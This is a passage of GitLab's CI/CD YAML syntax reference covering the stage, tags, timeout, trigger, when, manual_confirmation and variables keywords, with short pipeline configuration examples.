If a pipeline contains only jobs in the `.pre` or `.post` stages, it does not run.
There must be at least one other job in a different stage.

**Keyword type**: You can only use it with a job’s `stage` keyword.

**Example of `stage: .post`**:

YAML Copy to clipboard

```yaml
stages:
  - build
  - test

job1:
stage: build
script:
    - echo "This job runs in the build stage."

last-job:
stage: .post
script:
    - echo "This job runs in the .post stage, after all other stages."

job2:
stage: test
script:
    - echo "This job runs in the test stage."
```

**Additional details**:

- A [pipeline execution policy](https://docs.gitlab.com/user/application_security/policies/pipeline_execution_policies/) can define a `.pipeline-policy-post` stage which runs after `.post`.

### `tags` [Permalink](https://docs.gitlab.com/ci/yaml/\#tags "Permalink")

Use `tags` to select a specific runner from the list of all runners that are
available for the project.

When you register a runner, you can specify the runner’s tags, for
example `ruby`, `postgres`, or `development`. To pick up and run a job, a runner must
be assigned every tag listed in the job.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- An array of tag names, which are case-sensitive.
- CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `tags`**:

YAML Copy to clipboard

```yaml
job:
tags:
    - ruby
    - postgres
```

In this example, only runners with both the `ruby` and `postgres` tags can run the job.

**Additional details**:

- The number of tags must be less than `50`.

**Related topics**:

- [Use tags to control which jobs a runner can run](https://docs.gitlab.com/ci/runners/configure_runners/#control-jobs-that-a-runner-can-run)
- [Select different runner tags for each parallel matrix job](https://docs.gitlab.com/ci/jobs/job_control/#select-different-runner-tags-for-each-parallel-matrix-job)
- Runner tags for hosted runners:
  - [Hosted runners on Linux](https://docs.gitlab.com/ci/runners/hosted_runners/linux/)
  - [GPU-enabled hosted runners](https://docs.gitlab.com/ci/runners/hosted_runners/gpu_enabled/)
  - [Hosted runners on macOS](https://docs.gitlab.com/ci/runners/hosted_runners/macos/)
  - [Hosted runners on Windows](https://docs.gitlab.com/ci/runners/hosted_runners/windows/)

### `timeout` [Permalink](https://docs.gitlab.com/ci/yaml/\#timeout "Permalink")

Use `timeout` to configure a timeout for a specific job. If the job runs for longer
than the timeout, the job fails.

The job-level timeout can be longer than the [project-level timeout](https://docs.gitlab.com/ci/pipelines/settings/#set-a-limit-for-how-long-jobs-can-run),
but can’t be longer than the [runner’s timeout](https://docs.gitlab.com/ci/runners/configure_runners/#set-the-maximum-job-timeout).

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**: A period of time written in natural language. For example, these are all equivalent:

- `3600 seconds`
- `60 minutes`
- `one hour`

**Example of `timeout`**:

YAML Copy to clipboard

```yaml
build:
script: build.sh
timeout: 3 hours 30 minutes

test:
script: rspec
timeout: 3h 30m
```

### `trigger` [Permalink](https://docs.gitlab.com/ci/yaml/\#trigger "Permalink")

History

- Support for `environment` [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/369061) in GitLab 16.4.

Use `trigger` to declare that a job is a “trigger job” which starts a
[downstream pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/) that is either:

- [A multi-project pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#multi-project-pipelines).
- [A child pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines).

Trigger jobs can use only a limited set of GitLab CI/CD configuration keywords.
The keywords available for use in trigger jobs are:

- [`allow_failure`](https://docs.gitlab.com/ci/yaml/#allow_failure).
- [`extends`](https://docs.gitlab.com/ci/yaml/#extends).
- [`needs`](https://docs.gitlab.com/ci/yaml/#needs), but not [`needs:project`](https://docs.gitlab.com/ci/yaml/#needsproject).
- [`only` and `except`](https://docs.gitlab.com/ci/yaml/deprecated_keywords/#only--except).
- [`parallel`](https://docs.gitlab.com/ci/yaml/#parallel).
- [`rules`](https://docs.gitlab.com/ci/yaml/#rules).
- [`stage`](https://docs.gitlab.com/ci/yaml/#stage).
- [`trigger`](https://docs.gitlab.com/ci/yaml/#trigger).
- [`variables`](https://docs.gitlab.com/ci/yaml/#variables).
- [`when`](https://docs.gitlab.com/ci/yaml/#when) (only with a value of `on_success`, `on_failure`, or `always`).
- [`resource_group`](https://docs.gitlab.com/ci/yaml/#resource_group).
- [`environment`](https://docs.gitlab.com/ci/yaml/#environment).

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- For multi-project pipelines, the path to the downstream project. CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file)
in GitLab 15.3 and later, but not [job-only variables](https://docs.gitlab.com/ci/variables/predefined_variables/#variable-availability).
Alternatively, use [`trigger:project`](https://docs.gitlab.com/ci/yaml/#triggerproject).
- For child pipelines, use [`trigger:include`](https://docs.gitlab.com/ci/yaml/#triggerinclude).

**Example of `trigger`**:

YAML Copy to clipboard

```yaml
trigger-multi-project-pipeline:
trigger: my-group/my-project
```

**Additional details**:

- You can use [`when:manual`](https://docs.gitlab.com/ci/yaml/#when) in the same job as `trigger`, but you cannot
use the API to start `when:manual` trigger jobs. See [issue 284086](https://gitlab.com/gitlab-org/gitlab/-/issues/284086)
for more details.
- You cannot [manually specify CI/CD variables](https://docs.gitlab.com/ci/jobs/job_control/#specify-variables-when-running-manual-jobs)
before running a manual trigger job.
- [CI/CD variables](https://docs.gitlab.com/ci/yaml/#variables) defined in a top-level `variables` section (globally) or in the trigger job are forwarded
to the downstream pipeline as [trigger variables](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#pass-cicd-variables-to-a-downstream-pipeline).
- [Pipeline variables](https://docs.gitlab.com/ci/variables/#cicd-variable-precedence) are not passed
to downstream pipelines by default. Use [trigger:forward](https://docs.gitlab.com/ci/yaml/#triggerforward) to forward
these variables to downstream pipelines.
- [Job-only variables](https://docs.gitlab.com/ci/variables/predefined_variables/#variable-availability)
are not available in trigger jobs.
- Environment variables [defined in the runner’s `config.toml`](https://docs.gitlab.com/runner/configuration/advanced-configuration.html#the-runners-section) are not available to trigger jobs and are not passed to downstream pipelines.
- You cannot use [`needs:pipeline:job`](https://docs.gitlab.com/ci/yaml/#needspipelinejob) in a trigger job.

**Related topics**:

- [Multi-project pipeline configuration examples](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#trigger-a-downstream-pipeline-from-a-job-in-the-gitlab-ciyml-file).
- To run a pipeline for a specific branch, tag, or commit, you can use a [trigger token](https://docs.gitlab.com/ci/triggers/)
to authenticate with the [pipeline triggers API](https://docs.gitlab.com/api/pipeline_triggers/).
The trigger token is different than the `trigger` keyword.

#### `trigger:inputs` [Permalink](https://docs.gitlab.com/ci/yaml/\#triggerinputs "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/519963) in GitLab 17.11.

Use `trigger:inputs` to set the [inputs](https://docs.gitlab.com/ci/inputs/) for a multi-project pipeline
when the downstream pipeline configuration uses [`spec:inputs`](https://docs.gitlab.com/ci/yaml/#specinputs).

**Example of `trigger:inputs`**:

YAML Copy to clipboard

```yaml
trigger:
  - project: 'my-group/my-project'
    inputs:
      website: "My website"
```

#### `trigger:include` [Permalink](https://docs.gitlab.com/ci/yaml/\#triggerinclude "Permalink")

Use `trigger:include` to declare that a job is a “trigger job” which starts a
[child pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines).

Additionally, use:

- `trigger:include:artifact` to trigger a [dynamic child pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#dynamic-child-pipelines).
- `trigger:include:inputs` to set the [inputs](https://docs.gitlab.com/ci/inputs/) when the downstream pipeline configuration
uses [`spec:inputs`](https://docs.gitlab.com/ci/yaml/#specinputs).

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- The path to the child pipeline’s configuration file.

**Example of `trigger:include`**:

YAML Copy to clipboard

```yaml
trigger-child-pipeline:
trigger:
    include: path/to/child-pipeline.gitlab-ci.yml
```

**Related topics**:

- [Child pipeline configuration examples](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#trigger-a-downstream-pipeline-from-a-job-in-the-gitlab-ciyml-file).

#### `trigger:include:inputs` [Permalink](https://docs.gitlab.com/ci/yaml/\#triggerincludeinputs "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/519963) in GitLab 17.11.

Use `trigger:include:inputs` to set the [inputs](https://docs.gitlab.com/ci/inputs/) for a child pipeline
when the downstream pipeline configuration uses [`spec:inputs`](https://docs.gitlab.com/ci/yaml/#specinputs).

**Example of `trigger:inputs`**:

YAML Copy to clipboard

```yaml
trigger-job:
trigger:
    include:
      - local: path/to/child-pipeline.yml
        inputs:
          website: "My website"
```

#### `trigger:project` [Permalink](https://docs.gitlab.com/ci/yaml/\#triggerproject "Permalink")

Use `trigger:project` to declare that a job is a “trigger job” which starts a
[multi-project pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#multi-project-pipelines).

By default, the multi-project pipeline triggers for the default branch. Use `trigger:branch`
to specify a different branch.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- The path to the downstream project. CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file)
in GitLab 15.3 and later, but not [job-only variables](https://docs.gitlab.com/ci/variables/predefined_variables/#variable-availability).

**Example of `trigger:project`**:

YAML Copy to clipboard

```yaml
trigger-multi-project-pipeline:
trigger:
    project: my-group/my-project
```

**Example of `trigger:project` for a different branch**:

YAML Copy to clipboard

```yaml
trigger-multi-project-pipeline:
trigger:
    project: my-group/my-project
    branch: development
```

**Related topics**:

- [Multi-project pipeline configuration examples](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#trigger-a-downstream-pipeline-from-a-job-in-the-gitlab-ciyml-file).
- To run a pipeline for a specific branch, tag, or commit, you can also use a [trigger token](https://docs.gitlab.com/ci/triggers/)
to authenticate with the [pipeline triggers API](https://docs.gitlab.com/api/pipeline_triggers/).
The trigger token is different than the `trigger` keyword.

#### `trigger:strategy` [Permalink](https://docs.gitlab.com/ci/yaml/\#triggerstrategy "Permalink")

Use `trigger:strategy` to force the `trigger` job to wait for the downstream pipeline to complete
before it is marked as **success**.

This behavior is different than the default, which is for the `trigger` job to be marked as
**success** as soon as the downstream pipeline is created.

This setting makes your pipeline execution linear rather than parallel.

**Example of `trigger:strategy`**:

YAML Copy to clipboard

```yaml
trigger_job:
trigger:
    include: path/to/child-pipeline.yml
    strategy: depend
```

In this example, jobs from subsequent stages wait for the triggered pipeline to
successfully complete before starting.

**Additional details**:

- [Optional manual jobs](https://docs.gitlab.com/ci/jobs/job_control/#types-of-manual-jobs) in the downstream pipeline
do not affect the status of the downstream pipeline or the upstream trigger job.
The downstream pipeline can complete successfully without running any optional manual jobs.
- [Blocking manual jobs](https://docs.gitlab.com/ci/jobs/job_control/#types-of-manual-jobs) in the downstream pipeline
must run before the trigger job is marked as successful or failed. The trigger job
shows **running** (
status\_running) if the downstream pipeline status is
**waiting for manual action** (
status\_manual) due to manual jobs.
By default, jobs in later stages do not start until the trigger job completes.
- If the downstream pipeline has a failed job, but the job uses [`allow_failure: true`](https://docs.gitlab.com/ci/yaml/#allow_failure),
the downstream pipeline is considered successful and the trigger job shows **success**.

#### `trigger:forward` [Permalink](https://docs.gitlab.com/ci/yaml/\#triggerforward "Permalink")

History

- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/355572) in GitLab 15.1. [Feature flag `ci_trigger_forward_variables`](https://gitlab.com/gitlab-org/gitlab/-/issues/355572) removed.

Use `trigger:forward` to specify what to forward to the downstream pipeline. You can control
what is forwarded to both [parent-child pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines)
and [multi-project pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#multi-project-pipelines).

Forwarded variables do not get forwarded again in nested downstream pipelines by default,
unless the nested downstream trigger job also uses `trigger:forward`.

**Supported values**:

- `yaml_variables`: `true` (default), or `false`. When `true`, variables defined
in the trigger job are passed to downstream pipelines.
- `pipeline_variables`: `true` or `false` (default). When `true`, [pipeline variables](https://docs.gitlab.com/ci/variables/#cicd-variable-precedence)
are passed to the downstream pipeline.

**Example of `trigger:forward`**:

[Run this pipeline manually](https://docs.gitlab.com/ci/pipelines/#run-a-pipeline-manually), with
the CI/CD variable `MYVAR = my value`:

YAML Copy to clipboard

```yaml
variables: # default variables for each job
VAR: value

# Default behavior:
# - VAR is passed to the child
# - MYVAR is not passed to the child
child1:
trigger:
    include: .child-pipeline.yml

# Forward pipeline variables:
# - VAR is passed to the child
# - MYVAR is passed to the child
child2:
trigger:
    include: .child-pipeline.yml
    forward:
      pipeline_variables: true

# Do not forward YAML variables:
# - VAR is not passed to the child
# - MYVAR is not passed to the child
child3:
trigger:
    include: .child-pipeline.yml
    forward:
      yaml_variables: false
```

**Additional details**:

- CI/CD variables forwarded to downstream pipelines with `trigger:forward` are [pipeline variables](https://docs.gitlab.com/ci/variables/#cicd-variable-precedence),
which have high precedence. If a variable with the same name is defined in the downstream pipeline,
that variable is usually overwritten by the forwarded variable.

### `when` [Permalink](https://docs.gitlab.com/ci/yaml/\#when "Permalink")

Use `when` to configure the conditions for when jobs run. If not defined in a job,
the default value is `when: on_success`.

**Keyword type**: Job keyword. You can use it as part of a job. `when: always` and `when: never` can also be used in [`workflow:rules`](https://docs.gitlab.com/ci/yaml/#workflow).

**Supported values**:

- `on_success` (default): Run the job only when no jobs in earlier stages fail.
- `on_failure`: Run the job only when at least one job in an earlier stage fails.
- `never`: Don’t run the job regardless of the status of jobs in earlier stages.
Can only be used in a [`rules`](https://docs.gitlab.com/ci/yaml/#ruleswhen) section or [`workflow: rules`](https://docs.gitlab.com/ci/yaml/#workflowrules).
- `always`: Run the job regardless of the status of jobs in earlier stages.
- `manual`: Add the job to the pipeline as a [manual job](https://docs.gitlab.com/ci/jobs/job_control/#create-a-job-that-must-be-run-manually).
- `delayed`: Add the job to the pipeline as a [delayed job](https://docs.gitlab.com/ci/jobs/job_control/#run-a-job-after-a-delay).

**Example of `when`**:

YAML Copy to clipboard

```yaml
stages:
  - build
  - cleanup_build
  - test
  - deploy
  - cleanup

build_job:
stage: build
script:
    - make build

cleanup_build_job:
stage: cleanup_build
script:
    - cleanup build when failed
when: on_failure

test_job:
stage: test
script:
    - make test

deploy_job:
stage: deploy
script:
    - make deploy
when: manual
environment: production

cleanup_job:
stage: cleanup
script:
    - cleanup after jobs
when: always
```

In this example, the script:

1. Executes `cleanup_build_job` only when `build_job` fails.
2. Always executes `cleanup_job` as the last step in pipeline regardless of
success or failure.
3. Executes `deploy_job` when you run it manually in the GitLab UI.

**Additional details**:

- When evaluating the status of jobs for `on_success` and `on_failure`:
  - Jobs with [`allow_failure: true`](https://docs.gitlab.com/ci/yaml/#allow_failure) in earlier stages are considered successful, even if they failed.
  - Skipped jobs in earlier stages, for example [manual jobs that have not been started](https://docs.gitlab.com/ci/jobs/job_control/#create-a-job-that-must-be-run-manually),
    are considered successful.
- The default value for [`allow_failure`](https://docs.gitlab.com/ci/yaml/#allow_failure) is `true` with `when: manual`. The default value
changes to `false` with [`rules:when: manual`](https://docs.gitlab.com/ci/yaml/#ruleswhen).

**Related topics**:

- `when` can be used with [`rules`](https://docs.gitlab.com/ci/yaml/#rules) for more dynamic job control.
- `when` can be used with [`workflow`](https://docs.gitlab.com/ci/yaml/#workflow) to control when a pipeline can start.

#### `manual_confirmation` [Permalink](https://docs.gitlab.com/ci/yaml/\#manual_confirmation "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/18906) in GitLab 17.1.

Use `manual_confirmation` with [`when: manual`](https://docs.gitlab.com/ci/yaml/#when) to define a custom confirmation message for manual jobs.
If there is no manual job defined with `when: manual`, this keyword has no effect.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A string with the confirmation message.

**Example of `manual_confirmation`**:

YAML Copy to clipboard

```yaml
delete_job:
stage: post-deployment
script:
    - make delete
when: manual
manual_confirmation: 'Are you sure you want to delete this environment?'
```

## `variables` [Permalink](https://docs.gitlab.com/ci/yaml/\#variables "Permalink")

Use `variables` to define [CI/CD variables](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-gitlab-ciyml-file).

Variables can be [defined in a CI/CD job](https://docs.gitlab.com/ci/yaml/#job-variables), or as a top-level (global) keyword to define
[default CI/CD variables](https://docs.gitlab.com/ci/yaml/#default-variables) for all jobs.

**Additional details**:

- All YAML-defined variables are also set to any linked [Docker service containers](https://docs.gitlab.com/ci/services/).
- YAML-defined variables are meant for non-sensitive project configuration. Store sensitive information
in [protected variables](https://docs.gitlab.com/ci/variables/#protect-a-cicd-variable) or [CI/CD secrets](https://docs.gitlab.com/ci/secrets/).
- [Manual pipeline variables](https://docs.gitlab.com/ci/variables/#use-pipeline-variables)
and [scheduled pipeline variables](https://docs.gitlab.com/ci/pipelines/schedules/#add-a-pipeline-schedule)
are not passed to downstream pipelines by default. Use [trigger:forward](https://docs.gitlab.com/ci/yaml/#triggerforward)
to forward these variables to downstream pipelines.

**Related topics**:

- [Predefined variables](https://docs.gitlab.com/ci/variables/predefined_variables/) are variables the runner
automatically creates and makes available in the job.
- You can [configure runner behavior with variables](https://docs.gitlab.com/ci/runners/configure_runners/#configure-runner-behavior-with-variables).

### Job `variables` [Permalink](https://docs.gitlab.com/ci/yaml/\#job-variables "Permalink")

You can use job variables in commands in the job’s `script`, `before_script`, or `after_script` sections,
and also with some [job keywords](https://docs.gitlab.com/ci/yaml/#job-keywords). Check the **Supported values** section of each job keyword
to see if it supports variables.

You cannot use job variables as values for [global keywords](https://docs.gitlab.com/ci/yaml/#global-keywords) like
[`include`](https://docs.gitlab.com/ci/yaml/includes/#use-variables-with-include).

**Supported values**: Variable name and value pairs:

- The name can use only numbers, letters, and underscores ( `_`). In some shells,
the first character must be a letter.
- The value must be a string.

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of job `variables`**:

YAML Copy to clipboard

```yaml
review_job:
variables:
    DEPLOY_SITE: "https://dev.example.com/"
    REVIEW_PATH: "/review"
script:
    - deploy-review-script --url $DEPLOY_SITE --path $REVIEW_PATH
```

In this example:

- `review_job` has `DEPLOY_SITE` and `REVIEW_PATH` job variables defined.
Both job variables can be used in the `script` section.

### Default `variables` [Permalink](https://docs.gitlab.com/ci/yaml/\#default-variables "Permalink")

Variables defined in a top-level `variables` section act as default variables
for all jobs.

Each default variable is made available to every job in the pipeline, except when
the job already has a variable defined with the same name. The variable defined in the job
[takes precedence](https://docs.gitlab.com/ci/variables/#cicd-variable-precedence), so the value of
the default variable with the same name cannot be used in the job.

Like job variables, you cannot use default variables as values for other global keywords,
like [`include`](https://docs.gitlab.com/ci/yaml/includes/#use-variables-with-include).

**Supported values**: Variable name and value pairs:

- The name can use only numbers, letters, and underscores ( `_`). In some shells,
the first character must be a letter.
- The value must be a string.

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Examples of `variables`**:

YAML Copy to clipboard

```yaml
variables:
DEPLOY_SITE: "https://example.com/"

deploy_job:
stage: deploy
script:
    - deploy-script --url $DEPLOY_SITE --path "/"
environment: production

deploy_review_job:
stage: deploy
variables:
    DEPLOY_SITE: "https://dev.example.com/"
    REVIEW_PATH: "/review"
script:
    - deploy-review-script --url $DEPLOY_SITE --path $REVIEW_PATH
environment: production
```

In this example:

- `deploy_job` has no variables defined. The default `DEPLOY_SITE` variable is copied to the job
and can be used in the `script` section.
- `deploy_review_job` already has a `DEPLOY_SITE` variable defined, so the default `DEPLOY_SITE`
is not copied to the job. The job also has a `REVIEW_PATH` job variable defined.
Both job variables can be used in the `script` section.

#### `variables:description` [Permalink](https://docs.gitlab.com/ci/yaml/\#variablesdescription "Permalink")

Use the `description` keyword to define a description for a default variable.
The description displays with [the prefilled variable name when running a pipeline manually](https://docs.gitlab.com/ci/pipelines/#prefill-variables-in-manual-pipelines).

**Keyword type**: You can only use this keyword with default `variables`, not job `variables`.

**Supported values**:

- A string. You can use Markdown.

**Example of `variables:description`**:

YAML Copy to clipboard

```yaml
variables:
DEPLOY_NOTE:
    description: "The deployment note. Explain the reason for this deployment."
```

**Additional details**:

- When used without `value`, the variable exists in pipelines that were not triggered manually,
and the default value is an empty string ( `''`).

#### `variables:value` [Permalink](https://docs.gitlab.com/ci/yaml/\#variablesvalue "Permalink")

Use the `value` keyword to define a pipeline-level (default) variable’s value. When used with
[`variables: description`](https://docs.gitlab.com/ci/yaml/#variablesdescription), the variable value is [prefilled when running a pipeline manually](https://docs.gitlab.com/ci/pipelines/#prefill-variables-in-manual-pipelines).

**Keyword type**: You can only use this keyword with default `variables`, not job `variables`.

**Supported values**:

- A string.

**Example of `variables:value`**:

YAML Copy to clipboard

```yaml
variables:
DEPLOY_ENVIRONMENT:
    value: "staging"
    description: "The deployment target. Change this variable to 'canary' or 'production' if needed."
```

**Additional details**:

- If used without [`variables: description`](https://docs.gitlab.com/ci/yaml/#variablesdescription), the behavior is
the same as [`variables`](https://docs.gitlab.com/ci/yaml/#variables).

#### `variables:options` [Permalink](https://docs.gitlab.com/ci/yaml/\#variablesoptions "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/105502) in GitLab 15.7.

Use `variables:options` to define an array of values that are [selectable in the UI when running a pipeline manually](https://docs.gitlab.com/ci/pipelines/#configure-a-list-of-selectable-prefilled-variable-values).

Must be used with `variables: value`, and the string defined for `value`:

- Must also be one of the strings in the `options` array.
- Is the default selection.

If there is no [`description`](https://docs.gitlab.com/ci/yaml/#variablesdescription),
this keyword has no effect.

**Keyword type**: You can only use this keyword with default `variables`, not job `variables`.

**Supported values**:

- An array of strings.

**Example of `variables:options`**:

YAML Copy to clipboard

```yaml
variables:
DEPLOY_ENVIRONMENT:
    value: "staging"
    options:
      - "production"
      - "staging"
      - "canary"
    description: "The deployment target. Set to 'staging' by default."
```

### `variables:expand` [Permalink](https://docs.gitlab.com/ci/yaml/\#variablesexpand "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/353991) in GitLab 15.6 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_raw_variables_in_yaml_config`. Disabled by default.
- [Enabled on GitLab.com](https://gitlab.com/gitlab-org/gitlab/-/issues/375034) in GitLab 15.6.
- [Enabled on GitLab Self-Managed](https://gitlab.com/gitlab-org/gitlab/-/issues/375034) in GitLab 15.7.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/375034) in GitLab 15.8. Feature flag `ci_raw_variables_in_yaml_config` removed.

Use the `expand` keyword to configure a variable to be expandable or not.

**Keyword type**: You can use this keyword with both default and job `variables`.

**Supported values**:

- `true` (default): The variable is expandable.
- `false`: The variable is not expandable.

**Example of `variables:expand`**:

YAML Copy to clipboard

```yaml
variables:
VAR1: value1
VAR2: value2 $VAR1
VAR3:
    value: value3 $VAR1
    expand: false
```

- The result of `VAR2` is `value2 value1`.
- The result of `VAR3` is `value3 $VAR1`.

**Additional details**:

- The `expand` keyword can only be used with default and job `variables` keywords.
You can’t use it with [`rules:variables`](https://docs.gitlab.com/ci/yaml/#rulesvariables) or [`workflow:rules:variables`](https://docs.gitlab.com/ci/yaml/#workflowrulesvariables).

## Help & feedback

[Edit this page](https://gitlab.com/gitlab-org/gitlab/-/blob/master/doc/ci/yaml/_index.md)

[Suggest updates](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Documentation)

[Request support](https://about.gitlab.com/support/)

[View pricing](https://about.gitlab.com/pricing/)

[Try GitLab for free](https://about.gitlab.com/free-trial/)

[Post on the GitLab forum](https://forum.gitlab.com/new-topic?title=topic%20title&body=topic%20body&tags=docs-feedback)

![Company Logo](https://cdn.cookielaw.org/logos/aa14a5c8-79e3-442a-8177-464ad850b19d/e46c1d0d-1f66-481f-bc06-5427671431da/253e6fee-c4c0-4b60-bc35-79cdae5dda32/gitlab-logo-100.png)

## Privacy Preference Center

## Privacy Preference Center

- ### Your Privacy

- ### Strictly Necessary Cookies

- ### Functionality Cookies

- ### Performance and Analytics Cookies

- ### Targeting and Advertising Cookies

- ### Ad User Data

- ### Ad Personalization


#### Your Privacy

When you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies. This information might be about you, your preferences or your device and is mostly used to make the site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience. Because we respect your right to privacy, you can choose not to allow some types of cookies. Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are able to offer.


[Cookie Policy](https://about.gitlab.com/privacy/cookies/)

User ID:  fb3fd8b3-ece8-428d-9ced-985f0a956616

This User ID will be used as a unique identifier while storing and accessing your preferences for future.

Timestamp:  --

#### Strictly Necessary Cookies

Always Active

These cookies are necessary for the website to function and cannot be switched off in our systems. They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, enabling you to securely log into the site, filling in forms, or using the customer checkout. GitLab processes any personal data collected through these cookies on the basis of our legitimate interest.

Cookies Details‎

#### Functionality Cookies

Functionality Cookies

These cookies enable helpful but non-essential website functions that improve your website experience. By recognizing you when you return to our website, they may, for example, allow us to personalize our content for you or remember your preferences. If you do not allow these cookies then some or all of these services may not function properly. GitLab processes any personal data collected through these cookies on the basis of your consent

Cookies Details‎

#### Performance and Analytics Cookies

Performance and Analytics Cookies

These cookies allow us and our third-party service providers to recognize and count the number of visitors on our websites and to see how visitors move around our websites when they are using it. This helps us improve our products and ensures that users can easily find what they need on our websites. These cookies usually generate aggregate statistics that are not associated with an individual. To the extent any personal data is collected through these cookies, GitLab processes that data on the basis of your consent.

Cookies Details‎

#### Targeting and Advertising Cookies

Targeting and Advertising Cookies

These cookies enable different advertising related functions. They may allow us to record information about your visit to our websites, such as pages visited, links followed, and videos viewed so we can make our websites and the advertising displayed on it more relevant to your interests. They may be set through our website by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant advertisements on other websites. GitLab processes any personal data collected through these cookies on the basis of your consent.

Cookies Details‎

#### Ad User Data

Ad User Data

Sets consent for sending user data to Google for advertising purposes.

Cookies Details‎

#### Ad Personalization

Ad Personalization

Sets consent for personalized advertising.

Cookies Details‎

Back Button

### Cookie List

Filter Button

ConsentLeg.Interest

checkbox labellabel

checkbox labellabel

checkbox labellabel

Clear

checkbox labellabel

ApplyCancel

Confirm My Choices

Allow All

[![Powered by Onetrust](https://cdn.cookielaw.org/logos/static/powered_by_logo.svg)](https://www.onetrust.com/products/cookie-consent/)

---


## 2. CI/CD YAML syntax reference {#section-2}

*Source: [https://docs.gitlab.com/ee/ci/yaml/index.html](https://docs.gitlab.com/ee/ci/yaml/index.html)*

# CI/CD YAML syntax reference

- Tier: Free, Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

This document lists the configuration options for the GitLab `.gitlab-ci.yml` file.
This file is where you define the CI/CD jobs that make up your pipeline.

- If you are already familiar with [basic CI/CD concepts](https://docs.gitlab.com/ci/), try creating
your own `.gitlab-ci.yml` file by following a tutorial that demonstrates a [simple](https://docs.gitlab.com/ci/quick_start/)
or [complex](https://docs.gitlab.com/ci/quick_start/tutorial/) pipeline.
- For a collection of examples, see [GitLab CI/CD examples](https://docs.gitlab.com/ci/examples/).
- To view a large `.gitlab-ci.yml` file used in an enterprise, see the
[`.gitlab-ci.yml` file for `gitlab`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab-ci.yml).

When you are editing your `.gitlab-ci.yml` file, you can validate it with the
[CI Lint](https://docs.gitlab.com/ci/yaml/lint/) tool.

## Keywords [Permalink](https://docs.gitlab.com/ci/yaml/\#keywords "Permalink")

A GitLab CI/CD pipeline configuration includes:

- [Global keywords](https://docs.gitlab.com/ci/yaml/#global-keywords) that configure pipeline behavior:




| Keyword | Description |
| --- | --- |
| [`default`](https://docs.gitlab.com/ci/yaml/#default) | Custom default values for job keywords. |
| [`include`](https://docs.gitlab.com/ci/yaml/#include) | Import configuration from other YAML files. |
| [`stages`](https://docs.gitlab.com/ci/yaml/#stages) | The names and order of the pipeline stages. |
| [`workflow`](https://docs.gitlab.com/ci/yaml/#workflow) | Control what types of pipeline run. |





|
|

- [Header keywords](https://docs.gitlab.com/ci/yaml/#header-keywords)




| Keyword | Description |
| --- | --- |
| [`spec`](https://docs.gitlab.com/ci/yaml/#spec) | Define specifications for external configuration files. |





|
|

- [Jobs](https://docs.gitlab.com/ci/jobs/) configured with [job keywords](https://docs.gitlab.com/ci/yaml/#job-keywords):




| Keyword | Description |
| --- | --- |
| [`after_script`](https://docs.gitlab.com/ci/yaml/#after_script) | Override a set of commands that are executed after job. |
| [`allow_failure`](https://docs.gitlab.com/ci/yaml/#allow_failure) | Allow job to fail. A failed job does not cause the pipeline to fail. |
| [`artifacts`](https://docs.gitlab.com/ci/yaml/#artifacts) | List of files and directories to attach to a job on success. |
| [`before_script`](https://docs.gitlab.com/ci/yaml/#before_script) | Override a set of commands that are executed before job. |
| [`cache`](https://docs.gitlab.com/ci/yaml/#cache) | List of files that should be cached between subsequent runs. |
| [`coverage`](https://docs.gitlab.com/ci/yaml/#coverage) | Code coverage settings for a given job. |
| [`dast_configuration`](https://docs.gitlab.com/ci/yaml/#dast_configuration) | Use configuration from DAST profiles on a job level. |
| [`dependencies`](https://docs.gitlab.com/ci/yaml/#dependencies) | Restrict which artifacts are passed to a specific job by providing a list of jobs to fetch artifacts from. |
| [`environment`](https://docs.gitlab.com/ci/yaml/#environment) | Name of an environment to which the job deploys. |
